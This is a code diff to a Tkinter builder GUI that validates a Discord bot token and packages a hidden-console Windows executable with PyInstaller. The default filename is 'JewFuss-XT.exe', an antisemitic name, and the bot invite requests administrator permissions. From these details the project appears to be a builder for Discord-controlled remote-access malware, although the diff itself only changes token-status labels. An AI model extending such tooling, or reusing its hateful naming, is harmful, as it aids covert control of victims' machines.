@@ -31,6 +31,8 @@ class BuilderUI(tk.Tk):
         self.bot_username = None
         self.bot_id = None
 
+        self.token_label_var = tk.StringVar(value="Bot token: (Invalid)")  # MODIFIED
+
         self.load_config()
         self.create_widgets()
         self.check_python()
@@ -44,13 +46,15 @@ class BuilderUI(tk.Tk):
         frm.grid(row=0, column=0, sticky="nsew")
         frm.columnconfigure(0, weight=1)
 
-        ttk.Label(frm, text="Bot token:").grid(row=0, column=0, sticky="w")
+        self.token_label = ttk.Label(frm, textvariable=self.token_label_var)  # MODIFIED
+        self.token_label.grid(row=0, column=0, sticky="w")
+
         self.token_var = tk.StringVar(value=self.config.get("token",""))
         self.ent_token = ttk.Entry(frm, textvariable=self.token_var)
         self.ent_token.grid(row=1, column=0, sticky="ew", pady=(0,5))
+
         self.token_err = tk.StringVar()
-        ttk.Label(frm, textvariable=self.token_err, foreground="red")\
-            .grid(row=2, column=0, sticky="w")
+        ttk.Label(frm, textvariable=self.token_err, foreground="red").grid(row=2, column=0, sticky="w")
 
         ttk.Label(frm, text="Exe filename:").grid(row=3, column=0, sticky="w")
         self.exe_var = tk.StringVar(value=self.config.get("exe_filename","JewFuss-XT.exe"))
@@ -103,6 +107,7 @@ class BuilderUI(tk.Tk):
             self._validate_token_thread()
         else:
             self.after(0, lambda: self.token_err.set("Invalid format"))
+            self.after(0, lambda: self.token_label_var.set("Bot token: (Invalid)"))  # MODIFIED
             self.after(0, self.update_build_state)
 
     def on_token_change(self):
@@ -112,6 +117,7 @@ class BuilderUI(tk.Tk):
             self._validate_token_thread()
         else:
             self.token_err.set("Invalid format")
+            self.token_label_var.set("Bot token: (Invalid)")  # MODIFIED
             self.token_valid = False
             self.update_build_state()
 
@@ -130,15 +136,17 @@ class BuilderUI(tk.Tk):
                     self.bot_username = f"{info['username']}#{info['discriminator']}"
                     self.bot_id = info['id']
                     self.token_valid = True
-                    print(f"Token validated for {self.bot_username}")
+                    self.after(0, lambda: self.token_label_var.set(f"Bot token: ({self.bot_username})"))  # MODIFIED
                     msg = ""
                 else:
                     self.token_valid = False
+                    self.after(0, lambda: self.token_label_var.set("Bot token: (Invalid)"))  # MODIFIED
                     msg = f"Invalid token ({r.status_code})"
                 self.after(0, lambda: self.token_err.set(msg))
             except Exception as e:
                 self.token_valid = False
                 print("Token validation error:", e)
+                self.after(0, lambda: self.token_label_var.set("Bot token: (Invalid)"))  # MODIFIED
                 self.after(0, lambda: self.token_err.set("API error"))
             self.after(0, self.update_build_state)
 
@@ -202,7 +210,7 @@ class BuilderUI(tk.Tk):
         if not self.token_valid:
             messagebox.showerror("Error", "Invalid token")
             return
-        
+
         if self.icon_path:
             try:
                 dest = os.path.join(DATA_DIR, "prev_icon.ico")
@@ -211,7 +219,7 @@ class BuilderUI(tk.Tk):
                     print(f"Saved icon to {dest} for reuse")
             except Exception as e:
                 print(f"Failed to save prev_icon.ico: {e}")
-        
+
         self.disable_inputs()
         print("Starting buildprocess")
         threading.Thread(target=self.run_build, daemon=True).start()
@@ -234,7 +242,7 @@ class BuilderUI(tk.Tk):
         if os.path.isfile(outpth):
             bak = time.strftime('%Y-%m-%d-%H-%M-%S-') + out_name
             os.rename(outpth, os.path.join(OUTPUT_DIR, bak))
-    
+
         cmd = [
             sys.executable, '-m', 'PyInstaller', tf,
             '--onefile','--windowed','--noconsole',
@@ -252,9 +260,9 @@ class BuilderUI(tk.Tk):
 
         timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
         invite = f"https://discord.com/oauth2/authorize?client_id={self.bot_id}&permissions=8&scope=bot"
-        
+
         outpth = os.path.join(OUTPUT_DIR, out_file)
-        
+
         if os.path.isfile(outpth):
             if self.installer_var.get():
                 installer_py = os.path.join(BASE_DIR, "installer.py")
